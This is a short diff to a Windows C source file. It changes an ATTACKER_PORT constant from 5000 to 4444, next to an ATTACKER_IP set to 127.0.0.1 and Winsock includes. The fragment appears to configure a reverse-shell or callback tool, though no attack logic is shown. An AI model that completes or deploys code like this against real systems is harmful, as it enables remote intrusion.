@@ -4,7 +4,7 @@
 #include <ws2tcpip.h>
 
 #define ATTACKER_IP "127.0.0.1"
-#define ATTACKER_PORT 5000
+#define ATTACKER_PORT 4444
 
 #pragma comment(lib, "ws2_32.lib")
 
